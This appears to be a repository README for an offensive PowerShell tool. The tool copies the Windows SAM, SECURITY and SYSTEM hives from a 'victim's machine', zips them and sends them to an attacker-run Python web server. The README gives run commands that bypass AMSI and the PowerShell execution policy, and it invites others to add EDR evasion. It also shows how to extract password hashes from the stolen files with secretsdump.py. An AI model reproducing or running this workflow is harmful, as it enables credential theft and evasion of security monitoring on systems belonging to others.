# Powershell script for Windows local hashes extraction
This Powershell script saves SAM, SECURITY and SYSTEM hives in C:\Users\Public\, compress the files in an archive and send it to the POST Python Web server in this repo.    
For the moment, it is very verbose and may be detected by advanced security solutions such as EDR, feel free to add some evasion or I'll do it.   
You (obviously) need admin or SYSTEM privileges to use it.
## How to use
Start on your machine, the Python Web server `server.py` or the code below :
```bash
python3 server.py
```
On the victim's machine, bypass AMSI (use a technique from here : https://amsi.fail/) and execute the script `exfiltrate.ps1` :
```powershell
powershell.exe -ExecutionPolicy Bypass -File "C:\path\to\exfiltrate.ps1"
```
## Extract and retrieve the hashes
On your machine, decompress and run secretsdump.py :
```bash
unzip loot.zip
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```
